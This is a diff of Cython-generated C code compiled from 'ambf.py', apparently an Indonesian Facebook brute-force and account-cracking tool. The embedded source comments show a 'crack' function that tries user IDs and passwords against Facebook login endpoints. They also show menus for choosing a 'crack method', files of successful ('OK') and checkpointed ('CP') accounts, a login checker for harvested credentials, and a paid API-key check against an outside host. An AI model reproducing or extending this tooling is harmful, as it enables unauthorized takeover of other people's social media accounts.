  * 				exit(" [!] api key kamu sudah kadaluwarsa")
  */
-  __pyx_tuple__69 = PyTuple_Pack(1, __pyx_kp_s_api_key_tidak_terdaftar); if (unlikely(!__pyx_tuple__69)) __PYX_ERR(0, 719, __pyx_L1_error)
+  __pyx_tuple__69 = PyTuple_Pack(1, __pyx_kp_s_api_key_tidak_terdaftar); if (unlikely(!__pyx_tuple__69)) __PYX_ERR(0, 712, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__69);
   __Pyx_GIVEREF(__pyx_tuple__69);
 
-  /* "ambf.py":721
+  /* "ambf.py":714
  * 				exit(" [!] api key tidak terdaftar")
  * 			elif cek["status"] == "expired":
  * 				exit(" [!] api key kamu sudah kadaluwarsa")             # <<<<<<<<<<<<<<
  * 			else:
  * 				open(".__apikey__.txt","w").write(key)
  */
-  __pyx_tuple__70 = PyTuple_Pack(1, __pyx_kp_s_api_key_kamu_sudah_kadaluwarsa); if (unlikely(!__pyx_tuple__70)) __PYX_ERR(0, 721, __pyx_L1_error)
+  __pyx_tuple__70 = PyTuple_Pack(1, __pyx_kp_s_api_key_kamu_sudah_kadaluwarsa); if (unlikely(!__pyx_tuple__70)) __PYX_ERR(0, 714, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__70);
   __Pyx_GIVEREF(__pyx_tuple__70);
 
-  /* "ambf.py":732
- * 			print(" [+] Durasi Unlimited Harga Rp 50.000")
+  /* "ambf.py":722
+ * 		elif ask in ["3", "03"]:
  * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
  * 			nama = input(" [+] Nama   : ")             # <<<<<<<<<<<<<<
  * 			email = input(" [+] Email  : ")
  * 			durasi = input(" [+] Durasi : ")
  */
-  __pyx_tuple__71 = PyTuple_Pack(1, __pyx_kp_s_Nama); if (unlikely(!__pyx_tuple__71)) __PYX_ERR(0, 732, __pyx_L1_error)
+  __pyx_tuple__71 = PyTuple_Pack(1, __pyx_kp_s_Nama); if (unlikely(!__pyx_tuple__71)) __PYX_ERR(0, 722, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__71);
   __Pyx_GIVEREF(__pyx_tuple__71);
 
-  /* "ambf.py":733
+  /* "ambf.py":723
  * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
  * 			nama = input(" [+] Nama   : ")
  * 			email = input(" [+] Email  : ")             # <<<<<<<<<<<<<<
  * 			durasi = input(" [+] Durasi : ")
  * 			apikey = open(".apikey", "r").read()
  */
-  __pyx_tuple__72 = PyTuple_Pack(1, __pyx_kp_s_Email); if (unlikely(!__pyx_tuple__72)) __PYX_ERR(0, 733, __pyx_L1_error)
+  __pyx_tuple__72 = PyTuple_Pack(1, __pyx_kp_s_Email); if (unlikely(!__pyx_tuple__72)) __PYX_ERR(0, 723, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__72);
   __Pyx_GIVEREF(__pyx_tuple__72);
 
-  /* "ambf.py":734
+  /* "ambf.py":724
  * 			nama = input(" [+] Nama   : ")
  * 			email = input(" [+] Email  : ")
  * 			durasi = input(" [+] Durasi : ")             # <<<<<<<<<<<<<<
  * 			apikey = open(".apikey", "r").read()
  * 			url_wa = "https://api.whatsapp.com/send?phone=6285864653276&text="
  */
-  __pyx_tuple__73 = PyTuple_Pack(1, __pyx_kp_s_Durasi); if (unlikely(!__pyx_tuple__73)) __PYX_ERR(0, 734, __pyx_L1_error)
+  __pyx_tuple__73 = PyTuple_Pack(1, __pyx_kp_s_Durasi); if (unlikely(!__pyx_tuple__73)) __PYX_ERR(0, 724, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__73);
   __Pyx_GIVEREF(__pyx_tuple__73);
 
@@ -24016,97 +23741,97 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  * 	try:
  * 		ua = open(".ua", "r").read()
  */
-  __pyx_tuple__101 = PyTuple_Pack(20, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_host, __pyx_n_s_kwargs, __pyx_n_s_ua_2, __pyx_n_s_pw, __pyx_n_s_ses, __pyx_n_s_p, __pyx_n_s_b, __pyx_n_s_bl, __pyx_n_s_i, __pyx_n_s_gaaa, __pyx_n_s_kuki, __pyx_n_s_ttl, __pyx_n_s_month, __pyx_n_s_day, __pyx_n_s_year, __pyx_n_s_e, __pyx_n_s_key, __pyx_n_s_value); if (unlikely(!__pyx_tuple__101)) __PYX_ERR(0, 472, __pyx_L1_error)
+  __pyx_tuple__101 = PyTuple_Pack(19, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_host, __pyx_n_s_kwargs, __pyx_n_s_ua_2, __pyx_n_s_pw, __pyx_n_s_ses, __pyx_n_s_p, __pyx_n_s_b, __pyx_n_s_bl, __pyx_n_s_i, __pyx_n_s_gaaa, __pyx_n_s_kuki, __pyx_n_s_ttl, __pyx_n_s_month, __pyx_n_s_day, __pyx_n_s_year, __pyx_n_s_key, __pyx_n_s_value); if (unlikely(!__pyx_tuple__101)) __PYX_ERR(0, 472, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__101);
   __Pyx_GIVEREF(__pyx_tuple__101);
-  __pyx_codeobj__102 = (PyObject*)__Pyx_PyCode_New(3, 0, 20, 0, CO_OPTIMIZED|CO_NEWLOCALS|CO_VARKEYWORDS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__101, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_crack, 472, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__102)) __PYX_ERR(0, 472, __pyx_L1_error)
+  __pyx_codeobj__102 = (PyObject*)__Pyx_PyCode_New(3, 0, 19, 0, CO_OPTIMIZED|CO_NEWLOCALS|CO_VARKEYWORDS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__101, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_crack, 472, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__102)) __PYX_ERR(0, 472, __pyx_L1_error)
 
-  /* "ambf.py":533
- * 			return crack(uid, pwx, "https://free.facebook.com")
+  /* "ambf.py":527
+ * 	loop+=1
  * 
  * def text_mulai():             # <<<<<<<<<<<<<<
  * 	print("\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal))
  * 	print(" [+] hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
  */
-  __pyx_codeobj__103 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_text_mulai, 533, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__103)) __PYX_ERR(0, 533, __pyx_L1_error)
+  __pyx_codeobj__103 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_text_mulai, 527, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__103)) __PYX_ERR(0, 527, __pyx_L1_error)
 
-  /* "ambf.py":538
+  /* "ambf.py":532
  * 	print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
  * 
  * def text_method():             # <<<<<<<<<<<<<<
  * 	print(" \n [ pilih method crack - coba method satu ]\n")
  * 	print(" [1]. method API (mode fast)")
  */
-  __pyx_codeobj__104 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_text_method, 538, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__104)) __PYX_ERR(0, 538, __pyx_L1_error)
+  __pyx_codeobj__104 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_text_method, 532, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__104)) __PYX_ERR(0, 532, __pyx_L1_error)
 
-  /* "ambf.py":544
+  /* "ambf.py":538
  * 	print(" [3]. method mobile (mode low)")
  * 
  * def setting_ua():             # <<<<<<<<<<<<<<
  * 	print("\n [ pilih user-agent hp anda ]\n")
  * 	print(" [1]. Xiaomi")
  */
-  __pyx_tuple__105 = PyTuple_Pack(2, __pyx_n_s_ua_2, __pyx_n_s_c_ua); if (unlikely(!__pyx_tuple__105)) __PYX_ERR(0, 544, __pyx_L1_error)
+  __pyx_tuple__105 = PyTuple_Pack(2, __pyx_n_s_ua_2, __pyx_n_s_c_ua); if (unlikely(!__pyx_tuple__105)) __PYX_ERR(0, 538, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__105);
   __Pyx_GIVEREF(__pyx_tuple__105);
-  __pyx_codeobj__106 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__105, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_setting_ua, 544, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__106)) __PYX_ERR(0, 544, __pyx_L1_error)
+  __pyx_codeobj__106 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__105, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_setting_ua, 538, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__106)) __PYX_ERR(0, 538, __pyx_L1_error)
 
-  /* "ambf.py":610
+  /* "ambf.py":603
+ * 		menu()
  * 
- * #-> Cek Opsi
  * def cek_opsi():             # <<<<<<<<<<<<<<
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
  * 	files = input(" [?] nama file  : ")
  */
-  __pyx_tuple__107 = PyTuple_Pack(5, __pyx_n_s_files, __pyx_n_s_buka_baju, __pyx_n_s_memek, __pyx_n_s_kontol, __pyx_n_s_titid); if (unlikely(!__pyx_tuple__107)) __PYX_ERR(0, 610, __pyx_L1_error)
+  __pyx_tuple__107 = PyTuple_Pack(5, __pyx_n_s_files, __pyx_n_s_buka_baju, __pyx_n_s_memek, __pyx_n_s_kontol, __pyx_n_s_titid); if (unlikely(!__pyx_tuple__107)) __PYX_ERR(0, 603, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__107);
   __Pyx_GIVEREF(__pyx_tuple__107);
-  __pyx_codeobj__108 = (PyObject*)__Pyx_PyCode_New(0, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__107, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_cek_opsi, 610, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__108)) __PYX_ERR(0, 610, __pyx_L1_error)
+  __pyx_codeobj__108 = (PyObject*)__Pyx_PyCode_New(0, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__107, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_cek_opsi, 603, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__108)) __PYX_ERR(0, 603, __pyx_L1_error)
 
-  /* "ambf.py":634
+  /* "ambf.py":627
  * 	menu()
  * 
  * def check_in(user, pasw):             # <<<<<<<<<<<<<<
  * 	mb = ("https://mbasic.facebook.com")
  * 	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
  */
-  __pyx_tuple__109 = PyTuple_Pack(21, __pyx_n_s_user, __pyx_n_s_pasw, __pyx_n_s_mb, __pyx_n_s_ua_2, __pyx_n_s_ses, __pyx_n_s_data, __pyx_n_s_ged, __pyx_n_s_fm, __pyx_n_s_list, __pyx_n_s_i, __pyx_n_s_run, __pyx_n_s_form, __pyx_n_s_dtsg, __pyx_n_s_jzst, __pyx_n_s_nh, __pyx_n_s_dataD, __pyx_n_s_xnxx, __pyx_n_s_ngew, __pyx_n_s_opt, __pyx_n_s_oh, __pyx_n_s_yy); if (unlikely(!__pyx_tuple__109)) __PYX_ERR(0, 634, __pyx_L1_error)
+  __pyx_tuple__109 = PyTuple_Pack(21, __pyx_n_s_user, __pyx_n_s_pasw, __pyx_n_s_mb, __pyx_n_s_ua_2, __pyx_n_s_ses, __pyx_n_s_data, __pyx_n_s_ged, __pyx_n_s_fm, __pyx_n_s_list, __pyx_n_s_i, __pyx_n_s_run, __pyx_n_s_form, __pyx_n_s_dtsg, __pyx_n_s_jzst, __pyx_n_s_nh, __pyx_n_s_dataD, __pyx_n_s_xnxx, __pyx_n_s_ngew, __pyx_n_s_opt, __pyx_n_s_oh, __pyx_n_s_yy); if (unlikely(!__pyx_tuple__109)) __PYX_ERR(0, 627, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__109);
   __Pyx_GIVEREF(__pyx_tuple__109);
-  __pyx_codeobj__110 = (PyObject*)__Pyx_PyCode_New(2, 0, 21, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__109, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_check_in, 634, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__110)) __PYX_ERR(0, 634, __pyx_L1_error)
+  __pyx_codeobj__110 = (PyObject*)__Pyx_PyCode_New(2, 0, 21, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__109, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_check_in, 627, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__110)) __PYX_ERR(0, 627, __pyx_L1_error)
 
-  /* "ambf.py":670
+  /* "ambf.py":663
  * 		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
  * 
  * def make():             # <<<<<<<<<<<<<<
  * 	os.system("git pull")
  * 	os.system("touch login.txt")
  */
-  __pyx_codeobj__111 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_make, 670, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__111)) __PYX_ERR(0, 670, __pyx_L1_error)
+  __pyx_codeobj__111 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_make, 663, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__111)) __PYX_ERR(0, 663, __pyx_L1_error)
 
-  /* "ambf.py":679
+  /* "ambf.py":672
  * 	login()
  * 
  * def cek_apikey():             # <<<<<<<<<<<<<<
  * 	key = open(".__apikey__.txt","r").read()
  * 	cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  */
-  __pyx_tuple__112 = PyTuple_Pack(2, __pyx_n_s_key, __pyx_n_s_cek); if (unlikely(!__pyx_tuple__112)) __PYX_ERR(0, 679, __pyx_L1_error)
+  __pyx_tuple__112 = PyTuple_Pack(2, __pyx_n_s_key, __pyx_n_s_cek); if (unlikely(!__pyx_tuple__112)) __PYX_ERR(0, 672, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__112);
   __Pyx_GIVEREF(__pyx_tuple__112);
-  __pyx_codeobj__113 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__112, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_cek_apikey, 679, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__113)) __PYX_ERR(0, 679, __pyx_L1_error)
+  __pyx_codeobj__113 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__112, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_cek_apikey, 672, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__113)) __PYX_ERR(0, 672, __pyx_L1_error)
 
-  /* "ambf.py":692
+  /* "ambf.py":685
  * 		return make()
  * 
  * def main():             # <<<<<<<<<<<<<<
  * 	try:
  * 		key = open(".__apikey__.txt","r").read()
  */
-  __pyx_tuple__114 = PyTuple_Pack(11, __pyx_n_s_key, __pyx_n_s_ask, __pyx_n_s_id1, __pyx_n_s_id2, __pyx_n_s_cek, __pyx_n_s_nama, __pyx_n_s_email, __pyx_n_s_durasi, __pyx_n_s_apikey_2, __pyx_n_s_url_wa, __pyx_n_s_tks); if (unlikely(!__pyx_tuple__114)) __PYX_ERR(0, 692, __pyx_L1_error)
+  __pyx_tuple__114 = PyTuple_Pack(11, __pyx_n_s_key, __pyx_n_s_ask, __pyx_n_s_id1, __pyx_n_s_id2, __pyx_n_s_cek, __pyx_n_s_nama, __pyx_n_s_email, __pyx_n_s_durasi, __pyx_n_s_apikey_2, __pyx_n_s_url_wa, __pyx_n_s_tks); if (unlikely(!__pyx_tuple__114)) __PYX_ERR(0, 685, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__114);
   __Pyx_GIVEREF(__pyx_tuple__114);
-  __pyx_codeobj__115 = (PyObject*)__Pyx_PyCode_New(0, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__114, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_main, 692, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__115)) __PYX_ERR(0, 692, __pyx_L1_error)
+  __pyx_codeobj__115 = (PyObject*)__Pyx_PyCode_New(0, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__114, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_main, 685, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__115)) __PYX_ERR(0, 685, __pyx_L1_error)
   __Pyx_RefNannyFinishContext();
   return 0;
   __pyx_L1_error:;
@@ -25585,127 +25310,127 @@ if (!__Pyx_RefNanny) {
   if (PyDict_SetItem(__pyx_d, __pyx_n_s_crack, __pyx_t_6) < 0) __PYX_ERR(0, 472, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":533
- * 			return crack(uid, pwx, "https://free.facebook.com")
+  /* "ambf.py":527
+ * 	loop+=1
  * 
  * def text_mulai():             # <<<<<<<<<<<<<<
  * 	print("\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal))
  * 	print(" [+] hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
  */
-  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_27text_mulai, 0, __pyx_n_s_text_mulai, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__103)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 533, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_27text_mulai, 0, __pyx_n_s_text_mulai, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__103)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 527, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_text_mulai, __pyx_t_6) < 0) __PYX_ERR(0, 533, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_text_mulai, __pyx_t_6) < 0) __PYX_ERR(0, 527, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":538
+  /* "ambf.py":532
  * 	print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
  * 
  * def text_method():             # <<<<<<<<<<<<<<
  * 	print(" \n [ pilih method crack - coba method satu ]\n")
  * 	print(" [1]. method API (mode fast)")
  */
-  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_29text_method, 0, __pyx_n_s_text_method, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__104)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 538, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_29text_method, 0, __pyx_n_s_text_method, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__104)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 532, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_text_method, __pyx_t_6) < 0) __PYX_ERR(0, 538, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_text_method, __pyx_t_6) < 0) __PYX_ERR(0, 532, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":544
+  /* "ambf.py":538
  * 	print(" [3]. method mobile (mode low)")
  * 
  * def setting_ua():             # <<<<<<<<<<<<<<
  * 	print("\n [ pilih user-agent hp anda ]\n")
  * 	print(" [1]. Xiaomi")
  */
-  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_31setting_ua, 0, __pyx_n_s_setting_ua, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__106)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 544, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_31setting_ua, 0, __pyx_n_s_setting_ua, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__106)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 538, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_setting_ua, __pyx_t_6) < 0) __PYX_ERR(0, 544, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_setting_ua, __pyx_t_6) < 0) __PYX_ERR(0, 538, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":610
+  /* "ambf.py":603
+ * 		menu()
  * 
- * #-> Cek Opsi
  * def cek_opsi():             # <<<<<<<<<<<<<<
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
  * 	files = input(" [?] nama file  : ")
  */
-  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_33cek_opsi, 0, __pyx_n_s_cek_opsi, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__108)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 610, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_33cek_opsi, 0, __pyx_n_s_cek_opsi, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__108)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 603, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cek_opsi, __pyx_t_6) < 0) __PYX_ERR(0, 610, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cek_opsi, __pyx_t_6) < 0) __PYX_ERR(0, 603, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":634
+  /* "ambf.py":627
  * 	menu()
  * 
  * def check_in(user, pasw):             # <<<<<<<<<<<<<<
  * 	mb = ("https://mbasic.facebook.com")
  * 	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
  */
-  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_35check_in, 0, __pyx_n_s_check_in, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__110)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 634, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_35check_in, 0, __pyx_n_s_check_in, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__110)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 627, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check_in, __pyx_t_6) < 0) __PYX_ERR(0, 634, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check_in, __pyx_t_6) < 0) __PYX_ERR(0, 627, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":670
+  /* "ambf.py":663
  * 		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
  * 
  * def make():             # <<<<<<<<<<<<<<
  * 	os.system("git pull")
  * 	os.system("touch login.txt")
  */
-  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_37make, 0, __pyx_n_s_make, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__111)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 670, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_37make, 0, __pyx_n_s_make, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__111)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 663, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_make, __pyx_t_6) < 0) __PYX_ERR(0, 670, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_make, __pyx_t_6) < 0) __PYX_ERR(0, 663, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":679
+  /* "ambf.py":672
  * 	login()
  * 
  * def cek_apikey():             # <<<<<<<<<<<<<<
  * 	key = open(".__apikey__.txt","r").read()
  * 	cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  */
-  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_39cek_apikey, 0, __pyx_n_s_cek_apikey, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__113)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 679, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_39cek_apikey, 0, __pyx_n_s_cek_apikey, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__113)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 672, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cek_apikey, __pyx_t_6) < 0) __PYX_ERR(0, 679, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cek_apikey, __pyx_t_6) < 0) __PYX_ERR(0, 672, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":692
+  /* "ambf.py":685
  * 		return make()
  * 
  * def main():             # <<<<<<<<<<<<<<
  * 	try:
  * 		key = open(".__apikey__.txt","r").read()
  */
-  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_41main, 0, __pyx_n_s_main, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__115)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 692, __pyx_L1_error)
